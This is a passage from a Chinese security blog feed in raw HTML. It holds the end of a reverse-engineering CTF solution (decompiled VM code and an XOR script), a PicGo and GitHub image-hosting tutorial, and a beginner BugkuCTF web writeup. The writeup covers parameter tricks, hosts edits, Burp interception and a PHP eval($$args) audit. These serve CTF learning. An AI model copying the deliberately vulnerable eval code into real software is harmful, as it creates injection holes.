punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>              <span class="token punctuation">{</span>                <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                    <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">!=</span> <span class="token number">10</span> <span class="token punctuation">)</span>              <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>a1                                                                  <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                  <span class="token operator">+</span> <span class="token number">8LL</span>                                                                  <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">></span> <span class="token number">10</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"err.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">!=</span> <span class="token number">12</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">>=</span> <span class="token number">12</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2LL</span> <span class="token operator">*</span> <span class="token function">SHIWORD</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>a1                                                            <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2LL</span> <span class="token operator">*</span> v4 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                            <span class="token operator">+</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token operator">!=</span> <span class="token number">255</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题目前网上没有什么分析，只有一个解题脚本，也是通过异或试出来的：</p><pre class="line-numbers language-py"><code class="language-py">a=[0x003C, 0x0030, 0x003F, 0x0007, 0x0019, 0x0012, 0x0000, 0x001E, 0x0018, 0x001A, 0x001A, 0x0042, 0x0046, 0x0010, 0x0010, 0x0010, 0x0014, 0x001F, 0x000C, 0x00FD]  x=90  for i in a:      print(chr(i^x),end='')      x+=2    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后成功获得flag：<strong>flag{vfvrvt24dfhncr}</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 易霖博杯 </tag>
            
            <tag> CTF </tag>
            
            <tag> C </tag>
            
            <tag> Re </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo+GitHub 图床搭建</title>
      <link href="/posts/7a46f93c.html"/>
      <url>/posts/7a46f93c.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>用GitHub搭建图床，在很久之前我就有了解，但由于市面上有挺多免费的图床，比如我之前一直在用的 路过图床，所以一直懒得动手搭建GitHub图床。一直到前两天我在完善博客的相册时，发现 路过图床 免费版的有这么多限制，比如：每小时限制上传50张图片，每天限制上传100张图片，而且免费版用户的存储容量貌似不过300M，这才意识到有一个自己的GitHub图床是多么重要。</p><h3 id="0x001-PicGO-介绍"><a href="#0x001-PicGO-介绍" class="headerlink" title="0x001 PicGO 介绍"></a>0x001 PicGO 介绍</h3><p>PicGo是一款图片上传工具，目前支持 SM.MS图床、腾讯云COS、GitHub图床、七牛图床、Imgur图床、阿里云OSS、又拍云图床，未来将支持更多图床。</p><p>在支持的这些图床中，SM.MS和Imgur有免费版和收费版，免费版的肯定有很多的使用限制，比如每小时限制上传次数，限制用户的上传容量等等；腾讯云COS、阿里云、有拍云都是要收费使用的；七牛云貌似前期使用免费，后期又要收费才能使用，就剩下的GitHub才是免费且最可靠的。</p><p>PicGo源项目GitHub地址已给出，但是去GitHub下载速度非常慢，这里额外提供一个蓝奏云的快速下载地址。</p><ul><li>GitHub地址：<a href="https://github.com/Molunerfinn/PicGo" target="_blank" rel="noopener">https://github.com/Molunerfinn/PicGo</a></li><li>蓝奏云地址：<a href="https://luckyzmj.lanzous.com/id3e0id" target="_blank" rel="noopener">https://luckyzmj.lanzous.com/id3e0id</a></li></ul><h3 id="0x002-GitHub-图床"><a href="#0x002-GitHub-图床" class="headerlink" title="0x002 GitHub 图床"></a>0x002 GitHub 图床</h3><h4 id="1-创建GitHub图床仓库"><a href="#1-创建GitHub图床仓库" class="headerlink" title="1. 创建GitHub图床仓库"></a>1. 创建GitHub图床仓库</h4><p>首先需要有一个登录GitHub的账号，没有的话去<a href="https://github.com/" target="_blank" rel="noopener">GitHub官网</a>注册一个</p><p>创建一个新的图床仓库，点击右上角的New repository</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529155833.png" alt=""></p><p>填写如下配置信息，然后Create创建仓库</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529160010.png" alt=""></p><h4 id="2-获取GitHub-token值"><a href="#2-获取GitHub-token值" class="headerlink" title="2. 获取GitHub token值"></a>2. 获取GitHub token值</h4><p>点击右上的头像，选择设置Setting</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529160727.png" alt=""></p><p>点击选择Developer settings </p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529160939.png" alt=""></p><p>点击 Generate New token</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529161241.png" alt=""></p><p>填写如下配置信息，只要勾选repo选项即可，然后页面拉到底部点击Generate token 即可</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529161716.png" alt=""></p><p>此时会跳转到带有token的页面，将token值复制记录下来，之后用PicGo绑定GitHub图床时会利用到</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529162127.png" alt=""></p><h3 id="0x003-PicGo-配置"><a href="#0x003-PicGo-配置" class="headerlink" title="0x003 PicGo 配置"></a>0x003 PicGo 配置</h3><h4 id="1-绑定GitHub图床"><a href="#1-绑定GitHub图床" class="headerlink" title="1. 绑定GitHub图床"></a>1. 绑定GitHub图床</h4><p>首先下载安装好PicGo软件，然后在右列表找到GitHub图床配置</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529163130.png" alt=""></p><p><strong>1. 设定仓库名(必填)：</strong> </p><p>按照“GitHub账户名/仓库名的格式填写”，比如我的是：Luckyzmj/imgbed</p><p><strong>2. 设定分支名(必填)：</strong> </p><p>分支名统一填写“master”</p><p><strong>3. 设定Token(必填)：</strong> </p><p>将之前步骤的Token值复制粘贴到这里</p><p><strong>4. 指定存储路径：</strong> </p><p>这个选项可以为空，如果想将图片上传到仓库的指定目录下，可以填写目录名加/，比如我的imgbed仓库下有个posts文件夹，需设置为 posts/</p><p><strong>5. 设定自定义域名：</strong> </p><p>这里统一用jsdelivr的CDN加速域名，在上传图片后成功后，PicGo会将“自定义域名+上传的图片名”生成的访问链接</p><pre><code>自定义域名格式：https://cdn.jsdelivr.net/gh/GitHub账户名/仓库名以我的格式为例：https://cdn.jsdelivr.net/gh/Luckyzmj/imgbed</code></pre><p>配置完全部信息后，点击 设为默认图床，最后点击确定即可</p><h4 id="2-上传图片到图床"><a href="#2-上传图片到图床" class="headerlink" title="2. 上传图片到图床"></a>2. 上传图片到图床</h4><p>在上传区上传图片，可支持本地图片上传(可多选图片)、剪贴板上传、URL上传等三种方式。上传图片成功后，选择你想要生成的图片链接格式</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529170555.png" alt=""></p><p>在图片区，可以看到成功上传的图片，选择相应的图片进行操作即可</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200529170831.png" alt=""></p><h4 id="3-PicGo-注意事项"><a href="#3-PicGo-注意事项" class="headerlink" title="3. PicGo 注意事项"></a>3. PicGo 注意事项</h4><p>如果配置完PicGo后却上传图片失败，可以参考以下方法：</p><ol><li>检查自定义域名是否正确</li><li>仓库名不要有空格</li><li>图片名字不要带有特殊符号，如：%、+、*、空格等</li><li>建议开启时间戳重命名，防止图片名字重复</li><li>上传图片间歇太短，需在PicGo设置中关闭Server选项</li><li>PicGo应用不稳定因素，需重启应用</li></ol><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://blog.csdn.net/sunhwee/article/details/100109956" target="_blank" rel="noopener">https://blog.csdn.net/sunhwee/article/details/100109956</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PicGo </tag>
            
            <tag> GitHub图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF——web篇writeup（持续更新）</title>
      <link href="/posts/d5238490.html"/>
      <url>/posts/d5238490.html</url>
      
        <content type="html"><![CDATA[<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>打开页面后F12查看源代码即可。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111091159946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：KEY{Web-2-bugKssNNikls9100}</strong></p><h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p>这里做了输入长度限制，F12选中输入框，修改长度限制即可。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111091632360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：flag{CTF-bugku-0032}</strong></p><h3 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h3><p>这里要理解超全局变量$_GET，只要我们传递的参数为what，并且内容为flag，即可输出flag。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111091945391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag{bugku_get_su8kej2en}</strong></p><h3 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h3><p>这里跟上面一样，不过要借助插件hackerbar进行一个POST传输。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111092232511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><strong>flag：flag{bugku_get_ssseint67se}</strong></p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>这里题目要求num为1却不能是数字，这就很矛盾了，我们传一个以1开头，不能以数字结尾的字符串就行了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111109274652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><strong>flag：flag{bugku-789-ps-ssdf}</strong></p><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>这道题跟web2有异曲同工之妙，都是F12查看源代码找到线索，唯一不同就是web3进行了一次Unicode编码，解码即可获得flag。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111093247380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><h5 id="修改host文件"><a href="#修改host文件" class="headerlink" title="修改host文件"></a>修改host文件</h5><p>这个很简单，修改hosts文件即可。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111093401855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>hosts文件在<strong>C:\Windows\System32\drivers\etc</strong>下，修改后<strong>访问flag.baidu.com</strong>即可得到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111109370042.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>flag：KEY{DSAHDSJ82HDS2211}</strong></p><h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>访问页面后它会无限刷新，我们挂一个Burp抓抓包就好了，会出现一个10.jpg的页面，这个页面的长度跟其他页面长度不同，flag就在里边。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111095059988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><h5 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h5><p>这考察了超全局变量的运用，先来分析一下代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 关闭报错</span><span class="token keyword">include</span> <span class="token string">"flag1.php"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 包含flag1.php文件</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 高亮显示文件内容</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 判断GET接收的参数是不是args</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 把ages的值赋给$args</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//添加正则匹配，只允许至少一个的任意数字字母，与$args进行匹配</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//    如果匹配不上就输出args error</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$args);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//    把内容当作PHP代码执行，$$args相当于$($args)</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里一开始想到的是用eval执行一个file()函数，来进行文件包含，但是这里对用户的输入进行了正则过滤，所以考虑到用GLOBAS[]输出所有的全局变量<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20180325123921587?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzA2ODc4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag{92853051ab894a64f7865cf3c2128b34}</strong></p><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><h5 id="控制台解码"><a href="#控制台解码" class="headerlink" title="控制台解码"></a>控制台解码</h5><p>首先F12查看源代码，发现有一串被处理的字符串<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111234127730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>直接粘贴到控制台中，得到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111234218460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" 